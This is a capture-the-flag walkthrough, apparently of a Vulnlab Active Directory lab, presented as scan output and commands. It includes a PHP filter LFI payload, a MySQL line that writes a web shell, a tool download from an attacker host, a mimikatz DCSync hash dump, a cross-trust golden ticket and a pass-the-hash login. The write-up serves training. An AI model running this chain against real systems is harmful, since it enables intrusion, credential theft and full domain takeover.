Scan 1 : 
```sh
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-28 04:01:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-07-28T04:02:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=trusteddc.trusted.vl
| Not valid before: 2024-07-27T03:53:47
|_Not valid after:  2025-01-26T03:53:47
| rdp-ntlm-info:
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-28T04:02:42+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49988/tcp open  msrpc         Microsoft Windows RPC
56896/tcp open  msrpc         Microsoft Windows RPC
63538/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-07-28T04:02:43
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

Scan 2 :
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.196.22/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-28 04:08:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.196.22/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, FoundRows, SupportsCompression, InteractiveClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, IgnoreSigpipes, LongColumnFlag, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 8m@5'b96C,S<rLe6y&L,
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Not valid before: 2024-07-27T03:53:49
|_Not valid after:  2025-01-26T03:53:49
|_ssl-date: 2024-07-28T04:08:58+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-07-28T04:08:50+00:00
Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-07-28T04:08:52
|_  start_date: N/A
```

- ffuf we discover /dev/ and an LFI that help us to read db.php : 
```sh
http://10.10.196.22/dev/index.html?view=php://filter/convert.base64-encode/resource=../dev/db.php
```
- db.php: 
```sh
<?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
?>
```
- Access to mysql server : 
```sh
mysql -u root -h 10.10.196.22 -p
```

- Result :
```sh
MariaDB [news]> select * from users;
+----+------------+--------------+-----------+----------------------------------+
| id | first_name | short_handle | last_name | password                         |
+----+------------+--------------+-----------+----------------------------------+
|  1 | Robert     | rsmith       | Smith     | 7e7abb54bbef42f0fbfa3007b368def7 |
|  2 | Eric       | ewalters     | Walters   | d6e81aeb4df9325b502a02f11043e0ad |
|  3 | Christine  | cpowers      | Powers    | e3d3eb0f46fe5d75eed8d11d54045a60 |
+----+------------+--------------+-----------+----------------------------------+
3 rows in set (0.022 sec)

MariaDB [news]>
```

- Crack : 
```sh
7e7abb54bbef42f0fbfa3007b368def7:IHateEric2
```

- Enum : 
```sh
netexec wmi $t2 -u usernames.txt -p 'IHateEric2'
RPC         10.10.196.22    135    LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)
RPC         10.10.196.22    135    LABDC            [+] lab.trusted.vl\rsmith:IHateEric2
```
- Got a shell with mysql server : 
```sh
select '<?php echo "command: " . system($_REQUEST["cmd"]); ?>' into outfile "C:\\xampp\\htdocs\\dev\\shell.php";
```

User VL{349efd4b1ccbeb4d3ca0108fa5cc5802}

- **Trust Relationship** :
```sh
Invoke-WebRequest -Uri "http://10.8.3.12:8080/PowerView.ps1" -OutFile "C:\Users\administrator\Desktop\powerview.ps1"

Import-Module ./PowerView.ps1

Get-NetDomainTrust
```

- The SID for the child domain and parents
```powershell
Get-DomainSID # Child
Get-DomainGroup -Domain trusted.vl -Identity "Enterprise Admins" \| select distinguishedname,objectsid`
```

- Also we can use **Mimikatz** :
```sh
lsadump::trust
```


```sh
Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)
Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591-519)

```

- The KRBTGT hash for the child domain: using DCSync Attack :

 ```sh
 mimikatz # lsadump::dcsync /all /csv  
 ```
 - Result : 
 ```sh
[DC] 'lab.trusted.vl' will be the domain
[DC] 'labdc.lab.trusted.vl' will be the DC server
[DC] Exporting domain 'lab.trusted.vl'
1104    rsmith  30ef48d2054363df9244bc0d476e93dd        66048
502     krbtgt  c7a03c565c68c6fac5f8913fab576ebd        514
1106    ewalters        56d93bd5a8250652c7430a4467a8540a        66048
500     Administrator   75878369ad33f35b7070ca854100bc07        66048
1107    cpowers 322db798a55f85f09b3d61b976a13c43        66048
1000    LABDC$  c101e5fcd553128d23a62df1c509a576        532480
1103    TRUSTED$        182161c2718e1d45b2202d6e35a7eb6e        2080
```

 - Creating Golden ticket : 
 ```sh
mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```

- Dump NTDS : 
```SH
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
#Then connect with the hash win evil-winrm
evil-winrm  -i 10.10.185.69 -u 'Administrator' -H '15db914be1e6a896e7692f608a9d72ef'
```

- Change user pass and run ranascs to read the flag : 

Root VL{1ffd4561083a1bdbb4e15346ba7aaf31}